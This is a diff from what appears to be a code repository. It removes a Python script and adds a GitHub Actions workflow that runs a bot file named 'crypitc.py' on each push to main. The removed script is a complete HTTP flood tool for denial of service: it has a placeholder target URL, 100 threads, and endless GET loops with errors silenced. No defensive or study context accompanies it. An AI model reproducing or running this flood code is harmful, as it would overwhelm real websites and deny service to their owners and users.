@@ -1,26 +1,27 @@
-import requests
-from multiprocessing.dummy import Pool as ThreadPool
+name: Deploy Bot
 
-target_url = "https://example.com"  # Replace with your target URL
-num_requests = 100000000  # 100 million requests per second
+on:
+  push:
+    branches:
+      - main
 
-def send_request(_):
-    while True:
-        try:
-            response = requests.get(target_url)
-            # Uncomment the line below if you want to print the response content
-            # print(response.content)
-        except Exception as e:
-            # Uncomment the line below if you want to print the exception
-            # print(e)
-            pass
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
 
-# Create a pool of threads to send requests
-pool = ThreadPool(100)  # Adjust the pool size based on your system capabilities
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
 
-# Map the function to the pool and repeat it for the desired number of requests
-pool.map(send_request, range(num_requests))
+      - name: Set up Python
+        uses: actions/setup-python@v2
+        with:
+          python-version: '3.x'
 
-# Close the pool
-pool.close()
-pool.join()
+      - name: Install Dependencies
+        run: |
+          pip install -r requirements.txt
+
+      - name: Run Bot
+        run: python crypitc.py
+
